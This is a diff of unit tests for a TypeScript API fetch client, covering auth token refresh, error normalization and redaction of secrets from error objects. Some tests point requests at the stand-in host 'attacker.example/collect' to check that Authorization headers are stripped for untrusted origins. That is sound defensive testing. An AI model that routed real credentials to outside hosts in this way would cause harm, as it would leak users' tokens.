@@ -8,6 +8,7 @@ import {
   ApiResponseSizeError,
   ApiTimeoutError,
   ApiValidationError,
+  buildApiUrl,
   createApiFetcher,
   endpoint,
   formatApiLogEvent,
@@ -16,6 +17,7 @@ import {
   handleApiRoute,
   responseEnvelopeSchema,
   toApiRouteErrorResponse,
+  type ApiEndpoint,
   type FetchLike,
   type RawBodyFactory,
   type RetryStrategy,
@@ -97,6 +99,91 @@ describe("api-fetch", () => {
 
     expect(fetch.mock.calls[0]?.[1]?.body).toBe(body);
     expect(headers.get("Content-Type")).toBeNull();
+  });
+
+  it("keeps schema-free response payloads unknown while preserving select inference", async () => {
+    const api = createApiFetcher({
+      fetch: async () => jsonResponse({
+        id  : 1,
+        name: "haru"
+      })
+    });
+    const rawResult = await api.get("/raw");
+    const schemaResult = await api.get("/schema", {
+      responseSchema: User
+    });
+    const schemaSelected = await api.get("/schema-selected", {
+      responseSchema: User,
+      select        : (data) => data.name
+    });
+    const selected = await api.get("/selected", {
+      select: (data) => ({
+        present: typeof data === "object" && data !== null && "id" in data
+      })
+    });
+    const selectedEndpoint = endpoint.get("/selected-endpoint", {
+      select: (data) => typeof data === "object" && data !== null
+    });
+    const endpointResult = await api.call(selectedEndpoint);
+    const bodyAndResponseSelected = await api.post("/body-response-selected", {
+      body          : { name: "haru" },
+      bodySchema    : CreateUser,
+      responseSchema: User,
+      select        : (data) => data.id
+    });
+
+    expectTypeOf(rawResult.response).toBeUnknown();
+    expectTypeOf(schemaResult.response).toEqualTypeOf<{
+      id  : number;
+      name: string;
+    }>();
+    expectTypeOf(schemaSelected).toBeString();
+    expectTypeOf(selected).toEqualTypeOf<{ present: boolean }>();
+    expectTypeOf(endpointResult).toBeBoolean();
+    expectTypeOf(bodyAndResponseSelected).toBeNumber();
+
+    if (false) {
+      // @ts-expect-error schema-free reads cannot claim an unchecked output type
+      await api.get<{ id: number }>("/raw");
+      // @ts-expect-error schema-free writes cannot claim an unchecked output type
+      await api.post<{ id: number }>("/raw");
+      // @ts-expect-error schema-free requests cannot claim an unchecked output type
+      await api.request<{ id: number }>("GET", "/raw");
+      // @ts-expect-error schema-free endpoints cannot claim an unchecked output type
+      endpoint.get<{ id: number }>("/raw");
+
+      // @ts-expect-error a response schema generic requires the runtime schema
+      await api.get<typeof User>("/raw", {});
+      // @ts-expect-error a body schema generic requires options with bodySchema
+      await api.post<typeof CreateUser>("/raw");
+      // @ts-expect-error request body schema generics require runtime options
+      await api.request<typeof CreateUser>("POST", "/raw");
+
+      const Params = z.object({ id: z.number() });
+
+      // @ts-expect-error endpoint schema generics require params and bodySchema
+      endpoint.post<typeof Params, typeof CreateUser>("/users/:id");
+
+      const forgedEndpoint: ApiEndpoint<
+        undefined,
+        undefined,
+        undefined,
+        { id: number }
+      > = {
+        method : "GET",
+        // @ts-expect-error custom endpoint results require a runtime select function
+        options: {},
+        path   : "/raw"
+      };
+
+      await api.call(forgedEndpoint);
+    }
+  });
+
+  it("preserves complete fragments when appending query to relative paths", () => {
+    expect(buildApiUrl("/search#first#second#third", undefined, {
+      page: 1
+    })).toBe("/search?page=1#first#second#third");
   });
 
   it("rejects raw body and raw body factory together before fetch", async () => {
@@ -460,6 +547,68 @@ describe("api-fetch", () => {
     expect(capturedHeaders?.get("Authorization")).toBe("Bearer secret");
   });
 
+  it("does not trust a request-level baseURL as an implicit auth origin", async () => {
+    const captured: Headers[] = [];
+    const api = createApiFetcher({
+      baseURL: "https://api.example.com",
+      headers: {
+        Authorization        : "Client secret",
+        "Proxy-Authorization": "Client proxy secret"
+      },
+      auth: {
+        getAccessToken: async () => "bearer-secret"
+      },
+      fetch: async (_input, init) => {
+        captured.push(new Headers(init?.headers));
+
+        return jsonResponse({ ok: true });
+      }
+    });
+
+    await api.get("/collect", {
+      baseURL: "https://attacker.example",
+      headers: {
+        authorization        : "Request secret",
+        "proxy-authorization": "Request proxy secret"
+      }
+    });
+
+    expect(captured[0]?.get("Authorization")).toBeNull();
+    expect(captured[0]?.get("Proxy-Authorization")).toBeNull();
+  });
+
+  it("strips merged endpoint auth headers from untrusted origins", async () => {
+    let capturedHeaders: Headers | undefined;
+    const collect = endpoint.get("https://attacker.example/collect", {
+      headers: {
+        Authorization        : "Endpoint secret",
+        "Proxy-Authorization": "Endpoint proxy secret"
+      }
+    });
+    const api = createApiFetcher({
+      allowedOrigins: [],
+      baseURL       : "https://api.example.com",
+      headers: {
+        Authorization: "Client secret"
+      },
+      fetch: async (_input, init) => {
+        capturedHeaders = new Headers(init?.headers);
+
+        return jsonResponse({ ok: true });
+      }
+    });
+
+    await api.call(collect, {
+      headers: {
+        authorization        : "Call secret",
+        "proxy-authorization": "Call proxy secret"
+      }
+    });
+
+    expect(capturedHeaders?.get("Authorization")).toBeNull();
+    expect(capturedHeaders?.get("Proxy-Authorization")).toBeNull();
+  });
+
   it.each([
     String.raw`\\attacker.example\collect`,
     String.raw`/\attacker.example/collect`,
@@ -560,6 +709,27 @@ describe("api-fetch", () => {
     expect(exposed).not.toContain("upstream-token");
     expect(exposed).not.toContain("response-body-token");
     expect(exposed).not.toContain("response-header-token");
+  });
+
+  it("redacts URL userinfo from public error contexts and messages", async () => {
+    const api = createApiFetcher({
+      fetch: async () => jsonResponse({ message: "failed" }, 500)
+    });
+    const error = await api.get(
+      "https://url-user:url-password@api.example.com/private?token=query#fragment"
+    ).catch((reason: unknown) => reason);
+
+    expect(error).toBeInstanceOf(ApiHttpError);
+    expect(error).toMatchObject({
+      context: {
+        path: "https://api.example.com/private",
+        url : "https://api.example.com/private"
+      }
+    });
+    expect((error as Error).message).not.toContain("url-user");
+    expect((error as Error).message).not.toContain("url-password");
+    expect(JSON.stringify(error)).not.toContain("url-user");
+    expect(JSON.stringify(error)).not.toContain("url-password");
   });
 
   it("keeps parse and validation payloads unreachable from public errors", async () => {
@@ -694,8 +864,36 @@ describe("api-fetch", () => {
     expect(fetch).toHaveBeenCalledTimes(2);
   });
 
-  it("normalizes auth refresh errors and redacts query strings from error context", async () => {
-    const refreshError = new Error("refresh failed");
+  it("normalizes access tokens before comparing refresh generations", async () => {
+    const fetch = vi.fn<FetchLike>(async (_input, init) => (
+      new Headers(init?.headers).get("Authorization") === "Bearer fresh"
+        ? jsonResponse({ ok: true })
+        : jsonResponse({ message: "expired" }, 401)
+    ));
+    const api = createApiFetcher({
+      fetch,
+      auth: {
+        getAccessToken: () => " expired ",
+        refresh       : async () => "fresh"
+      }
+    });
+
+    await expect(api.get("/private")).resolves.toMatchObject({
+      response: { ok: true }
+    });
+    expect(fetch.mock.calls.map((call) => (
+      new Headers(call[1]?.headers).get("Authorization")
+    ))).toEqual([
+      "Bearer expired",
+      "Bearer fresh"
+    ]);
+  });
+
+  it("normalizes auth refresh errors without retaining callback secrets", async () => {
+    const refreshError = Object.assign(new Error("refresh-secret"), {
+      body   : { accessToken: "body-secret" },
+      headers: { Authorization: "header-secret" }
+    });
     const clear = vi.fn(async () => undefined);
     const api = createApiFetcher({
       baseURL: "https://api.example.com",
@@ -709,8 +907,13 @@ describe("api-fetch", () => {
       }
     });
 
-    await expect(api.get("/private?token=secret#debug")).rejects.toMatchObject({
-      cause  : refreshError,
+    const error = await api.get("/private?token=secret#debug")
+      .catch((reason: unknown) => reason);
+
+    expect(error).toMatchObject({
+      cause: {
+        type: "AUTH_CALLBACK_FAILURE"
+      },
       context: {
         method: "GET",
         path  : "/private",
@@ -719,7 +922,83 @@ describe("api-fetch", () => {
       message: "API authentication failed",
       name   : "ApiAuthError"
     });
+    expect((error as ApiAuthError).cause).not.toBe(refreshError);
+    expect(JSON.stringify(error)).not.toContain("refresh-secret");
+    expect(JSON.stringify(error)).not.toContain("body-secret");
+    expect(JSON.stringify(error)).not.toContain("header-secret");
     expect(clear).toHaveBeenCalledTimes(1);
+  });
+
+  it("does not trust an ApiHttpError thrown by an auth callback", async () => {
+    const callbackError = new ApiHttpError(
+      jsonResponse({ message: "response-secret" }, 418),
+      { token: "body-secret" },
+      {
+        method: "GET",
+        path  : "/callback?token=query-secret",
+        url   : "https://api.example.com/callback?token=query-secret"
+      },
+      {
+        message: "callback-http-secret"
+      }
+    );
+    const api = createApiFetcher({
+      fetch: async () => jsonResponse({ message: "expired" }, 401),
+      auth : {
+        getAccessToken: () => "expired",
+        refresh       : async () => {
+          throw callbackError;
+        }
+      }
+    });
+    const error = await api.get("/private")
+      .catch((reason: unknown) => reason);
+
+    expect(error).toMatchObject({
+      cause: {
+        type: "AUTH_CALLBACK_FAILURE"
+      },
+      name: "ApiAuthError"
+    });
+    expect((error as ApiAuthError).cause).not.toBe(callbackError);
+    expect(JSON.stringify(error)).not.toContain("callback-http-secret");
+    expect(JSON.stringify(error)).not.toContain("query-secret");
+  });
+
+  it("does not treat an ApiAbortError thrown by refresh as caller cancellation", async () => {
+    const callbackError = new ApiAbortError(
+      {
+        body   : "abort-body-secret",
+        headers: { Authorization: "abort-header-secret" }
+      },
+      {
+        method: "GET",
+        path  : "/callback?token=abort-query-secret",
+        url   : "https://api.example.com/callback?token=abort-query-secret"
+      }
+    );
+    const api = createApiFetcher({
+      fetch: async () => jsonResponse({ message: "expired" }, 401),
+      auth : {
+        getAccessToken: () => "expired",
+        refresh       : async () => {
+          throw callbackError;
+        }
+      }
+    });
+    const error = await api.get("/private")
+      .catch((reason: unknown) => reason);
+
+    expect(error).toBeInstanceOf(ApiAuthError);
+    expect(error).toMatchObject({
+      cause: {
+        type: "AUTH_CALLBACK_FAILURE"
+      }
+    });
+    expect(error).not.toBe(callbackError);
+    expect(JSON.stringify(error)).not.toContain("abort-body-secret");
+    expect(JSON.stringify(error)).not.toContain("abort-header-secret");
+    expect(JSON.stringify(error)).not.toContain("abort-query-secret");
   });
 
   it("normalizes auth refreshes that return no access token", async () => {
@@ -734,10 +1013,160 @@ describe("api-fetch", () => {
     });
 
     await expect(api.get("/private")).rejects.toMatchObject({
-      cause: expect.any(ApiHttpError),
+      cause: {
+        status: 401,
+        type  : "HTTP_FAILURE"
+      },
       name : "ApiAuthError"
     });
     expect(clear).toHaveBeenCalledTimes(1);
+  });
+
+  it.each([
+    ["whitespace", "   "],
+    ["control character", "fresh\nsecret"],
+    ["non-string", { token: "fresh" }]
+  ])("rejects unusable %s refresh results without retrying", async (_label, refreshed) => {
+    const clear = vi.fn(async () => undefined);
+    const fetch = vi.fn<FetchLike>(async () => jsonResponse({ message: "expired" }, 401));
+    const api = createApiFetcher({
+      fetch,
+      auth: {
+        clear,
+        getAccessToken: async () => "expired",
+        refresh       : async () => refreshed as unknown as string
+      }
+    });
+
+    await expect(api.get("/private")).rejects.toMatchObject({
+      cause: {
+        type: "AUTH_CALLBACK_FAILURE"
+      },
+      name: "ApiAuthError"
+    });
+    expect(fetch).toHaveBeenCalledTimes(1);
+    expect(clear).toHaveBeenCalledTimes(1);
+  });
+
+  it("isolates refresh flights by failed access-token generation", async () => {
+    let accessToken = "old";
+    const oldRefresh = createDeferred<string>();
+    const newRefresh = createDeferred<string>();
+    const refresh = vi.fn(async () => (
+      accessToken === "old" ? oldRefresh.promise : newRefresh.promise
+    ));
+    const fetch = vi.fn<FetchLike>(async (_input, init) => {
+      const token = new Headers(init?.headers).get("Authorization");
+
+      return token === "Bearer current" || token === "Bearer newest"
+        ? jsonResponse({ token })
+        : jsonResponse({ message: "expired" }, 401);
+    });
+    const api = createApiFetcher({
+      fetch,
+      auth: {
+        getAccessToken: () => accessToken,
+        refresh
+      }
+    });
+
+    const oldRequest = api.get("/old");
+
+    await vi.waitFor(() => {
+      expect(refresh).toHaveBeenCalledTimes(1);
+    });
+
+    accessToken = "new";
+    const newRequest = api.get("/new");
+
+    await vi.waitFor(() => {
+      expect(refresh).toHaveBeenCalledTimes(2);
+    });
+
+    accessToken = "current";
+    oldRefresh.resolve("stale-old-refresh");
+    newRefresh.resolve("newest");
+
+    await expect(oldRequest).resolves.toMatchObject({
+      response: { token: "Bearer current" }
+    });
+    await expect(newRequest).resolves.toMatchObject({
+      response: { token: "Bearer current" }
+    });
+    expect(refresh).toHaveBeenCalledTimes(2);
+    expect(fetch.mock.calls.map((call) => (
+      new Headers(call[1]?.headers).get("Authorization")
+    ))).not.toContain("Bearer stale-old-refresh");
+  });
+
+  it("uses a newer login token when an older refresh fails", async () => {
+    let accessToken = "old";
+    const refreshGate = createDeferred<string>();
+    const clear = vi.fn(async () => undefined);
+    const fetch = vi.fn<FetchLike>(async (_input, init) => (
+      new Headers(init?.headers).get("Authorization") === "Bearer new-login"
+        ? jsonResponse({ ok: true })
+        : jsonResponse({ message: "expired" }, 401)
+    ));
+    const api = createApiFetcher({
+      fetch,
+      auth: {
+        clear,
+        getAccessToken: () => accessToken,
+        refresh       : () => refreshGate.promise
+      }
+    });
+    const request = api.get("/private");
+
+    await vi.waitFor(() => {
+      expect(fetch).toHaveBeenCalledTimes(1);
+    });
+
+    accessToken = "new-login";
+    refreshGate.reject(new Error("stale refresh failure"));
+
+    await expect(request).resolves.toMatchObject({
+      response: { ok: true }
+    });
+    expect(clear).not.toHaveBeenCalled();
+  });
+
+  it("aborts one caller waiting on shared refresh without cancelling the flight", async () => {
+    const refreshGate = createDeferred<string>();
+    const refresh = vi.fn(() => refreshGate.promise);
+    const fetch = vi.fn<FetchLike>(async (_input, init) => (
+      new Headers(init?.headers).get("Authorization") === "Bearer fresh"
+        ? jsonResponse({ ok: true })
+        : jsonResponse({ message: "expired" }, 401)
+    ));
+    const api = createApiFetcher({
+      fetch,
+      auth: {
+        getAccessToken: () => "expired",
+        refresh
+      }
+    });
+    const controller = new AbortController();
+    const aborted = api.get("/aborted", {
+      signal: controller.signal
+    });
+    const active = api.get("/active");
+
+    await vi.waitFor(() => {
+      expect(refresh).toHaveBeenCalledTimes(1);
+    });
+
+    controller.abort("caller cancelled");
+
+    await expect(aborted).rejects.toBeInstanceOf(ApiAbortError);
+    expect(refresh).toHaveBeenCalledTimes(1);
+
+    refreshGate.resolve("fresh");
+
+    await expect(active).resolves.toMatchObject({
+      response: { ok: true }
+    });
+    expect(refresh).toHaveBeenCalledTimes(1);
   });
 
   it("normalizes auth responses when no refresh callback exists", async () => {
@@ -779,8 +1208,8 @@ describe("api-fetch", () => {
 
     await expect(api.get("/private")).rejects.toMatchObject({
       cause: expect.objectContaining({
-        name  : "ApiHttpError",
-        status: 401
+        status: 401,
+        type  : "HTTP_FAILURE"
       }),
       name: "ApiAuthError"
     });
@@ -817,9 +1246,8 @@ describe("api-fetch", () => {
     expect(error).toBeInstanceOf(ApiAuthError);
     expect(error).toMatchObject({
       cause: expect.objectContaining({
-        code   : "TOKEN_EXPIRED",
-        message: "API request failed: GET /private (401)",
-        status : 401
+        status: 401,
+        type  : "HTTP_FAILURE"
       }),
       name: "ApiAuthError"
     });
@@ -856,8 +1284,8 @@ describe("api-fetch", () => {
 
     await expect(api.get("/private")).rejects.toMatchObject({
       cause: expect.objectContaining({
-        name  : "ApiHttpError",
-        status: 419
+        status: 419,
+        type  : "HTTP_FAILURE"
       }),
       name: "ApiAuthError"
     });
@@ -934,7 +1362,10 @@ describe("api-fetch", () => {
     });
 
     await expect(api.get("/private")).rejects.toMatchObject({
-      cause: expect.any(ApiHttpError),
+      cause: {
+        status: 401,
+        type  : "HTTP_FAILURE"
+      },
       name : "ApiAuthError"
     });
   });
@@ -964,6 +1395,61 @@ describe("api-fetch", () => {
       authorization: null,
       token        : "access-token"
     });
+  });
+
+  it("normalizes token-header formatter failures without retaining callback secrets", async () => {
+    const clear = vi.fn(async () => undefined);
+    const fetch = vi.fn<FetchLike>(async () => jsonResponse({ ok: true }));
+    const api = createApiFetcher({
+      fetch,
+      auth: {
+        clear,
+        formatTokenHeader: () => {
+          throw Object.assign(new Error("formatter-secret"), {
+            headers: { Authorization: "header-secret" }
+          });
+        },
+        getAccessToken: () => "access-token"
+      }
+    });
+    const error = await api.get("/private")
+      .catch((reason: unknown) => reason);
+
+    expect(error).toMatchObject({
+      cause: {
+        type: "AUTH_CALLBACK_FAILURE"
+      },
+      name: "ApiAuthError"
+    });
+    expect(JSON.stringify(error)).not.toContain("formatter-secret");
+    expect(JSON.stringify(error)).not.toContain("header-secret");
+    expect(clear).toHaveBeenCalledTimes(1);
+    expect(fetch).not.toHaveBeenCalled();
+  });
+
+  it("does not misclassify unrelated invalid static headers as auth callback failures", async () => {
+    const clear = vi.fn(async () => undefined);
+    const formatTokenHeader = vi.fn(() => ({
+      Authorization: "Bearer formatted"
+    }));
+    const api = createApiFetcher({
+      auth: {
+        clear,
+        formatTokenHeader,
+        getAccessToken: () => "access-token"
+      },
+      fetch: async () => jsonResponse({ ok: true })
+    });
+    const error = await api.get("/private", {
+      headers: {
+        "X-Invalid": "invalid\nstatic-header"
+      }
+    }).catch((reason: unknown) => reason);
+
+    expect(error).toBeInstanceOf(TypeError);
+    expect(error).not.toBeInstanceOf(ApiAuthError);
+    expect(formatTokenHeader).not.toHaveBeenCalled();
+    expect(clear).not.toHaveBeenCalled();
   });
 
   it("keeps explicit request auth headers before formatted token headers", async () => {
@@ -1403,7 +1889,9 @@ describe("api-fetch", () => {
     });
 
     await expect(api.get("/me")).rejects.toMatchObject({
-      cause: refreshError,
+      cause: {
+        type: "AUTH_CALLBACK_FAILURE"
+      },
       name : "ApiAuthError"
     });
     await expect(api.get("/me")).resolves.toMatchObject({
